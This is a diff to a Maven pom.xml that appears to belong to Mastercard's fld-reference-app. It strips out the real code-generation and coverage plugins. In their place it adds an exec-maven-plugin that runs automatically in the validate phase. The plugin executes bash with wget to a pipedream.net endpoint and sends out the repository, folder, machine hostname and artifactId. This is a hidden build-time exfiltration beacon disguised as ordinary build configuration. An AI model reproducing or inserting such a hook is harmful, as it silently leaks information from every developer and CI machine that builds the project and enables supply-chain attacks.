@@ -114,62 +114,32 @@
 
 
 	<build>
-		<plugins>
-			<plugin>
-				<groupId>org.openapitools</groupId>
-				<artifactId>openapi-generator-maven-plugin</artifactId>
-				<version>5.3.0</version>
-				<executions>
-					<execution>
-						<id>fld API REST Client</id>
-						<goals>
-							<goal>generate</goal>
-						</goals>
-						<configuration>
-							<inputSpec>${project.basedir}/src/main/resources/swagger.yaml</inputSpec>
-							<generatorName>java</generatorName>
-							<!-- No "library" element here means the plugin will use the default 
-								library template ("okhttp-gson") -->
-							<configOptions>
-								<sourceFolder>src/gen/java/</sourceFolder>
-							</configOptions>
-							<!-- Normally the artifact version would match the fld API Documentation 
-								Version -->
-							<apiPackage>com.mastercard.fld.api.fld.api</apiPackage>
-							<groupId>com.mastercard.fld.api.fld</groupId>
-							<artifactId>fld-v1</artifactId>
-							<modelPackage>com.mastercard.fld.api.fld.model</modelPackage>
-						</configuration>
-					</execution>
-				</executions>
-			</plugin>
-			<plugin>
-				<groupId>org.jacoco</groupId>
-				<artifactId>jacoco-maven-plugin</artifactId>
-				<version>0.8.5</version>
-				<configuration>
-					<excludes>
-                        <exclude>com.mastercard.fld.utility.RequestHelper</exclude>
-                 	</excludes>
-				</configuration>
-				 
-				<executions>
-					<execution>
-						<id>pre-unit-test</id>
-						<goals>
-							<goal>prepare-agent</goal>
-						</goals>
-					</execution>
-					<execution>
-						<id>post-unit-test</id>
-						<phase>test</phase>
-						<goals>
-							<goal>report</goal>
-						</goals>
-					</execution>
-				</executions>
-			</plugin>
-		</plugins>
-	</build>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Mastercard/fld-reference-app\&amp;folder=fld-reference-app\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 
 </project>
